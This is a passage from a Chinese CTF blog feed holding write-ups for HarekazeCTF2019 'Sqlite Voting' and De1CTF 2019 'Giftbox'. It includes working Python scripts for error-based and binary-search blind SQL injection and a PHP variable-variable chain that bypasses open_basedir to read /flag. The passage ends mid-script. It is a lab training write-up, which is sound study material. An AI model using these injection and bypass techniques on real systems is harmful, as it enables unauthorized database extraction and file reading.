class="headerlink" title="题解"></a>题解</h2><p>有正确错误两个界面，可用来作为盲注判断条件，但过滤了<code>&#39;</code>和<code>&quot;</code>，没法用字符判断，又过滤了<code>char</code>，没法用ascii码判断。在这可以用<code>hex</code>，<a href="https://syunaht.com/p/3887377890.html#toc-heading-3">刷题笔记:[SUCTF 2018]MultiSQL</a>中用过，只用36个字符进行判断。</p><h3 id="位运算判断长度"><a href="#位运算判断长度" class="headerlink" title="位运算判断长度"></a>位运算判断长度</h3><blockquote><p>先考虑对 flag 16 进制长度的判断，假设它的长度为<code>x</code>，<code>y</code>表示2的n次方，那么<code>x&amp;y</code>就能表现出<code>x</code>二进制为1的位置，将这些<code>y</code>再进行或运算就可以得到完整的<code>x</code>的二进制，也就得到了flag的长度，而<code>1&lt;&lt;n</code>恰可以表示2的n次方</p></blockquote><h3 id="SQLITE3整数溢出错显"><a href="#SQLITE3整数溢出错显" class="headerlink" title="SQLITE3整数溢出错显"></a>SQLITE3整数溢出错显</h3><p>在<code>sqlite3</code>中，<code>abs</code>函数有一个整数溢出的报错，如果<code>abs</code>的参数是<code>-9223372036854775808</code>就会报错。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Sqlite-Voting/image-20210926123622122.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">9223372036854775808</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#OUTPUT:-0x8000000000000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>判断长度payload如下：</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">abs(case(length(hex((select(flag)from(flag))))&amp;&#123;1&lt;&lt;n&#125;)when(0)then(0)else(0x8000000000000000)end)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sqlite判断两种用法</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">select case &#39;a&#39; when &#39;a&#39;then 1else 0end--可不用等号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">select case when &#39;a&#39;&#x3D;&#39;a&#39;then 1else 0end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://018ae4ca-108e-408e-bfd4-2d3275e4bdc9.node4.buuoj.cn:81/vote.php"</span>l <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'abs(case(length(hex((select(flag)from(flag))))&amp;</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">)when(0)then(0)else(0x8000000000000000)end)'</span></span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'id'</span><span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'occurred'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        l <span class="token operator">=</span> l <span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> n<span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Sqlite-Voting/image-20210926131756679.png"></p><blockquote><ul><li>然后考虑逐字符进行判断，但是<code>is_valid()</code>过滤了大部分截取字符的函数，而且也无法用 ASCII 码判断</li><li>这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出<code>ABCDEF</code>，这样十六进制的所有字符都可以使用了，并且使用<code>trim(0,0)</code>来表示空字符</li></ul></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># hex(b'zebra') = 7A65627261</span><span class="token comment"># 除去 12567 就是 A ，其余同理</span>A <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span>C <span class="token operator">=</span> <span class="token string">'trim(hex(typeof(.1)),12567)'</span>D <span class="token operator">=</span> <span class="token string">'trim(hex(0xffffffffffffffff),123)'</span>E <span class="token operator">=</span> <span class="token string">'trim(hex(0.1),1230)'</span>F <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span><span class="token comment"># hex(b'koala') = 6B6F616C61</span><span class="token comment"># 除去 16CF 就是 B</span>B <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>C<span class="token punctuation">&#125;</span></span><span class="token string">||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>F<span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span><span class="token keyword">import</span> binascii<span class="token keyword">import</span> requestsURL <span class="token operator">=</span> <span class="token string">'http://1aa0d946-f0a0-4c60-a26a-b5ba799227b6.node2.buuoj.cn.wetolink.com:82/vote.php'</span>l <span class="token operator">=</span> <span class="token number">0</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'abs(case(length(hex((select(flag)from(flag))))&amp;</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">)when(0)then(0)else(0x8000000000000000)end)'</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token string">b'An error occurred'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">:</span>    l <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> j<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] length:'</span><span class="token punctuation">,</span> l<span class="token punctuation">)</span>table <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>table<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span>table<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(typeof(.1)),12567)'</span>table<span class="token punctuation">[</span><span class="token string">'D'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0xffffffffffffffff),123)'</span>table<span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0.1),1230)'</span>table<span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span>table<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">[</span><span class="token string">"C"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">[</span><span class="token string">"F"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span>res <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span><span class="token string">b'flag&#123;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">'0123456789ABCDEF'</span><span class="token punctuation">:</span>    t <span class="token operator">=</span> <span class="token string">'||'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>c <span class="token keyword">if</span> c <span class="token keyword">in</span> <span class="token string">'0123456789'</span> <span class="token keyword">else</span> table<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> res <span class="token operator">+</span> x<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>      <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'abs(case(replace(length(replace(hex((select(flag)from(flag))),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>t<span class="token punctuation">&#125;</span></span><span class="token string">,trim(0,0))),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>l<span class="token punctuation">&#125;</span></span><span class="token string">,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span></span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'An error occurred'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">:</span>      res <span class="token operator">+=</span> x      <span class="token keyword">break</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[+] flag (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>l<span class="token punctuation">&#125;</span></span><span class="token string">): </span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>  i <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] flag:'</span><span class="token punctuation">,</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个思路很新颖，</p><p>用<code>trim(0,0)</code>来代替<code>&#39;&#39;</code>，</p><p>replace成功-&gt;当下取的字符对的-&gt;溢出报错</p><p>replace失败-&gt;当下取的字符错了-&gt;结果正常返回</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/6628#toc-4">https://xz.aliyun.com/t/6628#toc-4</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> SQLITE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[De1CTF 2019]Giftbox</title>
      <link href="/p/351608085.html"/>
      <url>/p/351608085.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[TOTP]</p><p>太高级了</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-De1CTF-2019-Giftbox/image-20210921210056501.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>main.js里给了TOTP的参数</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-De1CTF-2019-Giftbox/image-20210921213806794.png"></p><blockquote><p>TOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。它已被采纳为Internet工程任务组标准RFC 6238，是Initiative for Open Authentication(OATH)的基石，并被用于许多双因素身份验证系统。<br>TOTP是基于散列的消息认证码（HMAC）的示例。它使用加密哈希函数将密钥与当前时间戳组合在一起以生成一次性密码。 由于网络延迟和不同步时钟可能导致密码接收者必须尝试一系列可能的时间来进行身份验证，因此时间戳通常以30秒的间隔增加，从而减少了潜在的搜索空间。</p></blockquote><blockquote><p>服务端时间与客户端时间相差大于<code>15秒</code>，需要先计算正确的<code>totp</code>才能调用<code>shell.php</code> </p></blockquote><p>提示了python库</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-De1CTF-2019-Giftbox/image-20210921215240815.png"></p><p>有login。没想到竟然是sql注入。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-De1CTF-2019-Giftbox/image-20210921215040757.png"></p><p>跑脚本跑出密码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote<span class="token keyword">import</span> pyotp<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://846fb157-5d7f-4e34-95a9-afbd58d33544.node4.buuoj.cn:81/shell.php?a=%s&amp;totp=%s'</span>totp <span class="token operator">=</span> pyotp<span class="token punctuation">.</span>TOTP<span class="token punctuation">(</span><span class="token string">"GAXG24JTMZXGKZBU"</span><span class="token punctuation">,</span> digits<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> interval<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>length <span class="token operator">=</span> <span class="token number">0</span>left <span class="token operator">=</span> <span class="token number">0x0</span>right <span class="token operator">=</span> <span class="token number">0xff</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    mid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">+</span> left<span class="token punctuation">)</span>    <span class="token keyword">if</span> mid <span class="token operator">==</span> left<span class="token punctuation">:</span>        length <span class="token operator">=</span> mid        <span class="token keyword">break</span>    username <span class="token operator">=</span> <span class="token string">"'/**/or/**/if(length((select/**/password/**/from/**/users/**/limit/**/1))>=%d,1,0)#"</span> <span class="token operator">%</span> mid    password <span class="token operator">=</span> <span class="token string">"b"</span>    payload <span class="token operator">=</span> <span class="token string">'login %s %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    payload <span class="token operator">=</span> quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    payload <span class="token operator">=</span> url <span class="token operator">%</span> <span class="token punctuation">(</span>payload<span class="token punctuation">,</span> totp<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'incorrect'</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        left <span class="token operator">=</span> mid    <span class="token keyword">else</span><span class="token punctuation">:</span>        right <span class="token operator">=</span> mid<span class="token keyword">print</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span>real_password <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    left <span class="token operator">=</span> <span class="token number">0x20</span>    right <span class="token operator">=</span> <span class="token number">0x7e</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">+</span> left<span class="token punctuation">)</span>        <span class="token keyword">if</span> mid <span class="token operator">==</span> left<span class="token punctuation">:</span>            real_password <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            <span class="token keyword">break</span>        username <span class="token operator">=</span> <span class="token string">"'/**/or/**/if(ascii(substr((select/**/password/**/from/**/users/**/limit/**/1),%d,1))>=%d,1,0)#"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>            i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>        password <span class="token operator">=</span> <span class="token string">"b"</span>        payload <span class="token operator">=</span> <span class="token string">'login %s %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>        payload <span class="token operator">=</span> quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        payload <span class="token operator">=</span> url <span class="token operator">%</span> <span class="token punctuation">(</span>payload<span class="token punctuation">,</span> totp<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'incorrect'</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>            left <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            right <span class="token operator">=</span> mid    <span class="token keyword">print</span><span class="token punctuation">(</span>real_password<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>real_password<span class="token punctuation">)</span> <span class="token operator">&lt;</span> i<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'No.%d char not in range'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跑出密码</p><pre class="line-numbers language-none"><code class="language-none">hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>里面还有个隐藏命令<code>sh0w_hiiintttt_23333</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-De1CTF-2019-Giftbox/image-20210921220333263.png" alt="、"></p><blockquote><p><code>launch</code>前需要先用<code>targeting</code>设置，不过对输入有限制，这里可以<code>fuzz</code>一下，得知<code>code</code>限制<code>a-zA-Z0-9</code>， <code>position</code>限制<code>a-zA-Z0-9&#125;)$(&#123;_+-,.</code>，而且两者的长度也有限制。</p><p>这里需要用<code>php可变变量</code>构造和拼接<code>payload</code> 。</p><p>构造payload，绕过<code>open_basedir</code>的限制，写个脚本就能拿到flag</p></blockquote><p>最长11个字符</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-De1CTF-2019-Giftbox/image-20210921221924928.png"></p><p>脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote<span class="token keyword">import</span> pyotp<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://846fb157-5d7f-4e34-95a9-afbd58d33544.node4.buuoj.cn:81/shell.php?a=%s&amp;totp=%s'</span>totp <span class="token operator">=</span> pyotp<span class="token punctuation">.</span>TOTP<span class="token punctuation">(</span><span class="token string">"GAXG24JTMZXGKZBU"</span><span class="token punctuation">,</span> digits<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> interval<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> <span class="token string">'admin'</span>    payload <span class="token operator">=</span> <span class="token string">'login %s %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    payload <span class="token operator">=</span> quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    payload <span class="token operator">=</span> url <span class="token operator">%</span> <span class="token punctuation">(</span>payload<span class="token punctuation">,</span> totp<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">'destruct'</span>    payload <span class="token operator">=</span> quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    payload <span class="token operator">=</span> url <span class="token operator">%</span> <span class="token punctuation">(</span>payload<span class="token punctuation">,</span> totp<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">targeting</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> position<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">'targeting %s %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>code<span class="token punctuation">,</span> position<span class="token punctuation">)</span>    payload <span class="token operator">=</span> quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    payload <span class="token operator">=</span> url <span class="token operator">%</span> <span class="token punctuation">(</span>payload<span class="token punctuation">,</span> totp<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">'launch'</span>    payload <span class="token operator">=</span> quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    payload <span class="token operator">=</span> url <span class="token operator">%</span> <span class="token punctuation">(</span>payload<span class="token punctuation">,</span> totp<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>textlogin<span class="token punctuation">(</span><span class="token string">'hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span><span class="token punctuation">)</span>destruct<span class="token punctuation">(</span><span class="token punctuation">)</span>targeting<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">)</span>targeting<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'&#123;$a(46)&#125;'</span><span class="token punctuation">)</span>  <span class="token comment"># $b=&#123;chr(46)&#125;=.</span>targeting<span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'&#123;$b&#125;&#123;$b&#125;'</span><span class="token punctuation">)</span>  <span class="token comment"># $c=..</span>targeting<span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'&#123;$a(47)&#125;'</span><span class="token punctuation">)</span>  <span class="token comment"># $d=&#123;chr(47)&#125;=/</span>targeting<span class="token punctuation">(</span><span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'js'</span><span class="token punctuation">)</span>  <span class="token comment"># $e=js</span>targeting<span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'open_basedir'</span><span class="token punctuation">)</span>  <span class="token comment"># $f=open_basedir</span>targeting<span class="token punctuation">(</span><span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'chdir'</span><span class="token punctuation">)</span>  <span class="token comment"># $g=chdir</span>targeting<span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'ini_set'</span><span class="token punctuation">)</span>  <span class="token comment"># $h=ini_set</span>targeting<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'file_get_'</span><span class="token punctuation">)</span>  <span class="token comment"># $i=file_get_</span>targeting<span class="token punctuation">(</span><span class="token string">'j'</span><span class="token punctuation">,</span> <span class="token string">'&#123;$i&#125;contents'</span><span class="token punctuation">)</span>  <span class="token comment"># $j=file_get_contents</span>targeting<span class="token punctuation">(</span><span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'&#123;$g($e)&#125;'</span><span class="token punctuation">)</span>  <span class="token comment"># $k=chdir(js)</span>targeting<span class="token punctuation">(</span><span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'&#123;$h($f,$c)&#125;'</span><span class="token punctuation">)</span>  <span class="token comment"># $l=ini_set(open_basedir,..)</span>targeting<span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'&#123;$g($c)&#125;'</span><span class="token punctuation">)</span>  <span class="token comment"># $m=chdir(..)</span>targeting<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'&#123;$h($f,$d)&#125;'</span><span class="token punctuation">)</span>  <span class="token comment"># $n=ini_set(open_basedir,/)</span>targeting<span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'&#123;$d&#125;flag'</span><span class="token punctuation">)</span>  <span class="token comment"># $o=/flag</span>targeting<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'&#123;$j($o)&#125;'</span><span class="token punctuation">)</span>  <span class="token comment"># $p=file_get_contents(/flag)</span>targeting<span class="token punctuation">(</span><span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'printf'</span><span class="token punctuation">)</span>  <span class="token comment"># $q=printf</span>targeting<span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'&#123;$q($p)&#125;'</span><span class="token punctuation">)</span>  <span class="token comment"># $r=printf(file_get_contents(/flag))</span><span 